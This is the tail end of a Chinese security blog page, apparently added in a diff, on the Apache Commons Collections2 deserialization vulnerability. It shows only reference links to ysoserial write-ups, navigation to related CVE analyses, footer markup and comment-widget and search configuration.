+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dce432db-b9c6-a34c-fd06-5c857cb4d25d.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dce432db-b9c6-a34c-fd06-5c857cb4d25d.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dce432db-b9c6-a34c-fd06-5c857cb4d25d.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dce432db-b9c6-a34c-fd06-5c857cb4d25d.png"
+        title="10.png" /></p>
+<h1 id="参考链接">参考链接</h1>
+<ol>
+<li><a href="https://www.cnblogs.com/nice0e3/p/13860621.html" target="_blank" rel="noopener noreffer">https://www.cnblogs.com/nice0e3/p/13860621.html</a></li>
+<li><a href="https://su18.org/post/ysoserial-su18-2/#commonscollections2" target="_blank" rel="noopener noreffer">https://su18.org/post/ysoserial-su18-2/#commonscollections2</a></li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-02-28</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="/apache-commons-collections2/" data-title="Apache Commons Collections2 反序列化漏洞分析" data-via="Da22lec"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="/apache-commons-collections2/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="/apache-commons-collections2/" data-title="Apache Commons Collections2 反序列化漏洞分析"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="/apache-commons-collections2/" data-title="Apache Commons Collections2 反序列化漏洞分析"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="/apache-commons-collections2/" data-title="Apache Commons Collections2 反序列化漏洞分析"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/cve-2022-21350-weblogic-t3-rce/" class="prev" rel="prev" title="CVE-2022-21350 WebLogic T3 RCE 简单分析"><i class="fas fa-angle-left fa-fw"></i>CVE-2022-21350 WebLogic T3 RCE 简单分析</a>
+            <a href="/cve-2022-22947-spring-cloud-gateway-spel-rce/" class="next" rel="next" title="CVE-2022-22947 Spring Cloud Gateway SPEL RCE 简单分析">CVE-2022-22947 Spring Cloud Gateway SPEL RCE 简单分析<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"你的评论 ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
